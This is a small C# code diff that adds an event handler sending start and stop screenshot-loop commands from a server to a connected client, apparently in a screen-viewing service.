@@ -103,6 +103,13 @@ namespace Sweep.Services
                 }.ToString());
             };
 
+            viewer.ScreenEvent += async (bool yoy) => {
+                await _server.SendMessageToClient(clientId, new JObject
+                {
+                    ["command"] = yoy ? "ssloop" : "stopss"
+                }.ToString());
+            };
+
             try
             {
                 Image shot;
